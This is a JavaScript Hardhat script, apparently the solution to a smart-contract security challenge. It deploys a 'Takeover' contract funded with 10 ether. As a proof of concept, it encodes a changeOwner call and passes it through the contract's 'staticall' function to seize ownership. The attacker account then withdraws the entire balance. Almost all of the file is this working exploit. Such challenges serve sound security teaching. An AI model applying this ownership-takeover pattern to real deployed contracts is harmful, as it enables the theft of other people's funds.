const { expect } = require("chai");
const { ethers } = require("hardhat");
const abiCoder = ethers.utils.defaultAbiCoder;

async function deploy(deployer) {
    let deployEth = ethers.utils.parseUnits("10", "ether");
    const Takeover = await ethers.getContractFactory("Takeover", deployer);
    const takeover = await Takeover.deploy({value:deployEth});
    return [takeover];
}

async function main() {
    console.log("\n CHALLENGE - 3\n");
    let [deployer, user1, attacker] = await ethers.getSigners();
    let [takeover] = await deploy(deployer);

    await expect(await takeover.owner()).to.equal(deployer.address);

    // POC

    console.log("\n EXPLOIT : \n");
    let payload = await takeover.interface.encodeFunctionData('changeOwner',[attacker.address]);

    let tx = await takeover.connect(attacker).staticall(takeover.address,payload,"nothing");
    await expect(tx).to.emit(takeover,'OwnershipChanged').withArgs(deployer.address,attacker.address);

    await expect(await takeover.owner()).to.equal(attacker.address);
    console.log("OWNER CHANGED TO : ",attacker.address);
    
    console.log("ATTACKER WITHDRAWS ALL THE BALANCE");
    await takeover.connect(attacker).withdrawAll();
}

main();